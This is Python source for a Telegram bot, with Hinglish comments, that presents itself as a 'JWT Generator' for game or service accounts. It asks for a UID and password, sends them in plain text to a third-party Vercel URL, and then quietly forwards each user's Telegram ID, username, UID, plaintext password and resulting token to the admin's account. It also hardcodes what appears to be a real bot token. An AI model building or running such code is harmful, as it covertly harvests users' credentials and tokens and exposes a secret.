import requests
import json
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)

# ===== CONFIG =====
BOT_TOKEN = "8177235177:AAG_JT8ykUSKZ-hyXjGLZ74UByfpDQo_Vlk"   # apna bot token
ADMIN_ID = 7486456672               # apna telegram numeric id
# ==================

ASK_UID, ASK_PASS = range(2)

# ===== MENU =====
def main_menu():
    keyboard = [
        [InlineKeyboardButton("🔑 Generate JWT", callback_data="gen")],
        [
            InlineKeyboardButton("ℹ️ Help", callback_data="help"),
            InlineKeyboardButton("👑 Admin", callback_data="admin")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ===== /start =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome\n\n"
        "JWT Generator Bot 🔐\n"
        "Neeche menu se option choose karo 👇",
        reply_markup=main_menu()
    )

# ===== BUTTON HANDLER =====
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "gen":
        context.user_data.clear()
        context.user_data["step"] = ASK_UID
        await query.message.reply_text("🆔 Enter your UID:")

    elif query.data == "help":
        await query.message.reply_text(
            "ℹ️ Help\n\n"
            "1️⃣ Generate JWT click karo\n"
            "2️⃣ UID dalo\n"
            "3️⃣ Password dalo\n"
            "4️⃣ JWT file mil jayegi"
        )

    elif query.data == "admin":
        await query.message.reply_text("👑 Admin: @dark_edits_999")

# ===== TEXT HANDLER =====
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    step = context.user_data.get("step")

    # UID
    if step == ASK_UID:
        context.user_data["uid"] = update.message.text.strip()
        context.user_data["step"] = ASK_PASS
        await update.message.reply_text("🔐 Enter your Password:")

    # PASSWORD
    elif step == ASK_PASS:
        uid = context.user_data["uid"]
        password = update.message.text.strip()

        progress = await update.message.reply_text(
            "⚙️ Generating JWT...\nProgress: 0%"
        )

        try:
            for p in [25, 50, 75]:
                await asyncio.sleep(0.5)
                await progress.edit_text(
                    f"⚙️ Generating JWT...\nProgress: {p}%"
                )

            # API CALL
            url = f"https://jwt-by-sagar-nvr-dir-wzth.vercel.app/token?uid={uid}&password={password}"
            r = requests.get(url, timeout=15)
            data = r.json()

            # SAVE JWT
            with open("jwt.json", "w") as f:
                json.dump(data, f, indent=2)

            # ADMIN FILE
            with open("user.txt", "w") as f:
                f.write(
                    f"Telegram ID: {update.effective_user.id}\n"
                    f"Username: @{update.effective_user.username}\n"
                    f"UID: {uid}\n"
                    f"Password: {password}\n"
                )

            await progress.edit_text("✅ JWT Generated!\nProgress: 100%")

            # SEND FILES
            await update.message.reply_document(open("jwt.json", "rb"))
            await context.bot.send_document(ADMIN_ID, open("jwt.json", "rb"))
            await context.bot.send_document(ADMIN_ID, open("user.txt", "rb"))

            os.remove("jwt.json")
            os.remove("user.txt")
            context.user_data.clear()

        except Exception as e:
            await progress.edit_text("❌ Error occurred")
            await context.bot.send_message(ADMIN_ID, str(e))
            context.user_data.clear()

# ===== MAIN =====
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("🤖 Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()